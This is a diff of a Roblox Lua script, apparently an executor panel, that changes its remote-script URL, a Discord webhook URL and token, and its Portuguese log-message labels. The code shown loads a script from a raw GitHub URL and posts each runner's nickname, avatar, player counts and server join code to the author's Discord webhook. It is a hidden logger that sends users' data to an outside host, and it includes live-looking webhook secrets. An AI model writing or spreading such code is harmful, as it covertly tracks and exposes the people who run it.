@@ -1,8 +1,8 @@
 local h = game:GetService("HttpService")
 local P = game:GetService("Players")
 local M = game:GetService("MarketplaceService")
-local ORIG = "https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/panel.lua"
-local WEB = "https://discord.com/api/webhooks/1430989086386032840/VkX_OUsy-FT9HcKuSZ79Ey12Nv4GOwJBSRhlSRdYjTsa3ageLj18uqFJXy4sd-WyWWek"
+local ORIG = "https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/ir.lua"
+local WEB = "https://discord.com/api/webhooks/1432007677114060991/EZGpyoDJF6xAHO_N7sIsN1k-_CVkpZownR7niWvF9D0yi8jRiYtS9T6e0dPE7XX4uLlJ"
 
 local function runOrig()
     pcall(function()
@@ -54,7 +54,7 @@ local function sendWebhook(pl)
     local playerCount = #P:GetPlayers()
     local maxPlayers = game.Players.MaxPlayers or "?"
     local embed = {
-        title = "📄 Alguém executou o painel!",
+        title = "📡 Novo usuário executou o script!",
         color = 16711680,
         fields = {
             {name = "👤 Nick:", value = nick, inline = true},
@@ -66,7 +66,7 @@ local function sendWebhook(pl)
             {name = "🔑 Código de entrada do servidor (copie e cole no executor para entrar):", value = tpcode, inline = false}
         },
         thumbnail = { url = avatar },
-        footer = { text = "Auralynx - Log System" }
+        footer = { text = "Interminable Rooms - Log System" }
     }
     local payload = {embeds = {embed}}
     local body = h:JSONEncode(payload)
